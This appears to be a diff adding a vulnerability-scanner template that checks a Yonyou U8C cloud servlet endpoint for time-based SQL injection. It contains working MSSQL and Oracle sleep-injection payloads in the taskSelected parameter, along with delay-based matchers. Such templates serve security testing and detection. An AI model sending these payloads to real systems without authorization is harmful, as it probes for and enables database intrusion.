@@ -1,0 +1,24 @@
+id: u8c-cloud-RepAddToTaskAction-sqli
+
+info:
+  name: u8c-cloud-RepAddToTaskAction-sqli
+  author: u8c-cloud-RepAddToTaskAction-sqli
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:5%27--&db_type=mssql HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27%29%20AND%206358%3dDBMS_PIPE%2eRECEIVE_MESSAGE%28CHR%28105%29%7c%7cCHR%2888%29%7c%7cCHR%28104%29%7c%7cCHR%2883%29%2c5%29%20AND%20%28%27zMDX%27%3d%27zMDX&db_type=oracle HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        condition: or
+        dsl:
+          - duration_1 > 5 && contains_all(body,'textFilter_keyDown')
+          - duration_2 > 5 && contains_all(body,'textFilter_keyDown')
